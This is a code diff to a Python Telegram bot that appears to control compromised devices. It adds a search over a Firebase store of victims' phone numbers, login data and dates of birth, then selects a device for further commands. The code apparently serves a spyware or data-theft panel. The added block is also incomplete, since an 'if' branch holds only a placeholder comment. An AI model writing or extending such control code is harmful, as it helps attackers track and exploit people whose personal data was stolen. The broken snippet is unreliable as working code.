@@ -120,7 +120,27 @@ async def set_firebase(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
 async def set_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if not await check(update): return
-    await show_device_page(update, context, 0)
+    global firebase_base, selected_device_id
+    if context.args:
+        # Yahan search logic hai jo tumne manga tha
+        search_query = " ".join(context.args).lower()
+        try:
+            response = requests.get(f"{firebase_base}/user_data.json")
+            clients = response.json() or {}
+            found_id = None
+            for client_id, info in clients.items():
+                if client_id.lower() == search_query or str(info.get('d_name', '')).lower() == search_query or str(info.get('phoneNumber', '')).lower() == search_query:
+                    found_id = client_id
+                    break
+            if found_id:
+                # ... (Device milne par details dikhane ka code)
+            else:
+                await update.message.reply_text(f"❌ Device '{search_query}' nahi mili.")
+        except Exception as e:
+            await update.message.reply_text(f"Error: {str(e)}")
+    else:
+        # Agar koi argument nahi diya, toh purani list dikha dega
+        await show_device_page(update, context, 0)
 
 async def show_device_page(update, context, page):
     global firebase_base
@@ -184,7 +204,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
         client_id = query.data.split("_")[1]
         selected_device_id = client_id
         try:
-            # Firebase se details fetch karna
             response = requests.get(f"{firebase_base}/user_data/{client_id}.json")
             details = response.json() or {}
             
@@ -196,8 +215,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             dob = login_data.get('dob', 'N/A')
             
             status = "ONLINE 🟢" if details.get('status') == "online" else "OFFLINE 🔴"
-            
-            # Wahi common message structure jo set_device command mein hai
             msg = (f"📱 {details.get('d_name', 'Unknown')}\n"
                    f"🆔 {client_id}\n"
                    f"📞 {details.get('phoneNumber', 'Unknown')}\n"
@@ -207,7 +224,6 @@ async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
                    f"📅 DOB: {dob}\n"
                    f"{status}\n\n"
                    f"✅ Device Select ho gayi! Next: /addchannel <channel_id>")
-            
             await query.edit_message_text(text=msg)
         except Exception as e:
             await query.edit_message_text(f"Error: {str(e)}")
